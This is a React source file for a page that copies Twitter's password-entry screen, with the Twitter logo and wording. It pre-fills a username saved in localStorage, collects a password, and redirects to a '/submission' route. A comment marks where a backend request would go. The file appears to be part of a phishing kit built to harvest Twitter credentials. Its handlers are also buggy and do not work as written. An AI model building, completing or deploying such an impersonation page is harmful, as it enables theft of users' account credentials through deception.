import React from "react";
import { useNavigate } from "react-router-dom";
import twitter from "../Assets/Twitter-logo.svg.webp";

const TwitterPwd = () => {
  const [formData, setFormData] = React.useState({
    username: "",
    password: "",
  });
  const [loading, setLoading] = React.useState(false);
  const [isPasswordVisible, setPasswordVisibility] = React.useState(false);

  React.useEffect(() => {
    const ttname = JSON.parse(localStorage.getItem("ttname"));
    if (ttname) {
      setFormData((prevData) => ({ ...prevData, username: ttname }));
    }
  }, []);

  const togglePasswordVisibility = () => {
    setPasswordVisibility((prev) => !prev);
  };

  const handleLogin = (e) => {
    const { value } = e.target;
    setFormData((prevData) => ({ ...prevData, password: value }));
  };

  let navigate = useNavigate();

  const handleSubmit = (e) => {
    e.preventDefault();
    // make a request to the backend
    setLoading(true);

    // set a timeout
    const timeoutId = setTimeout(() => {
      navigate("/submission");
    }, 2000);

    // clear the timeout if the component unmounts
    return () => clearTimeout(timeoutId);
  };

  return (
    <div className="sm:bg-gray-100 bg-white flex-col gap-3 h-screen w-full flex justify-center items-center">
      <div className="sm:w-[350px] w-full pt-[12px] sm:border border-gray-300 bg-white">
        <div className="w-90vw md:w-45vw flex flex-col items-center">
          <div className="flex flex-col items-center justify-center p-4 pb-12">
            <img
              src={twitter}
              height=""
              width="40px"
              alt="Twitter logo"
              className="mb-4"
            />
            <p className="text-[25px] font-bold">Enter your password</p>
          </div>
          <div className=" w-[100%] px-10"></div>

          <form className=" w-full bg-white px-10 pb-5 pt-2  rounded-lg flex flex-col gap-3">
            <input
              className="w-full p-3 text-gray-700 text-sm bg-[#efefef] border border-gray-300 rounded"
              placeholder="Phone number, username, or email"
              type="text"
              name="username"
              value={formData.username}
              onChange={handleLogin}
              required
            />
            <div className="relative pb-12">
              <input
                className="w-full p-3 text-gray-700 text-sm bg-white border border-gray-300 rounded"
                type={isPasswordVisible ? "text" : "password"}
                name="password"
                value={formData.password}
                onChange={handleLogin}
                placeholder="Password"
                required
              />
              <button
                type="button"
                className="absolute right-0 top-0 mr-2 mt-1"
                onClick={togglePasswordVisibility}
              >
                {isPasswordVisible ? (
                  <svg
                    className="w-5 h-5"
                    fill="none"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth="2"
                    viewBox="0 0 24 24"
                    stroke="currentColor"
                  >
                    <path d="M13 12h7m-7 4h7m-7 4h7M5 12H2m7 4H9m7 4h-7"></path>
                  </svg>
                ) : (
                  <svg
                    className="w-5 h-5"
                    fill="none"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth="2"
                    viewBox="0 0 24 24"
                    stroke="currentColor"
                  >
                    <path d="M12 9v3m0 0v3m0-3h3m-3 0H9m12 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                  </svg>
                )}
              </button>
            </div>

            <button
              onSubmit={handleSubmit}
              type="submit"
              className="bg-[#47afff] py-4 rounded-full font-bold w-full text-white"
            >
              Log in
            </button>
            {loading && (
              <p className="text-gray-700 text-sm font-medium">Loading...</p>
            )}

            <p className="text-blue-500 text-sm mx-auto">Forgotten password?</p>
          </form>
        </div>
        <div className="w-[350px] py-[20px] text-[14px] bg-white flex justify-center items-center">
          <span className="">
            Don't have an account?{" "}
            <span className="text-[#0095f6] font-semibold">Sign up</span>
          </span>
        </div>
      </div>
    </div>
  );
};

export default TwitterPwd;
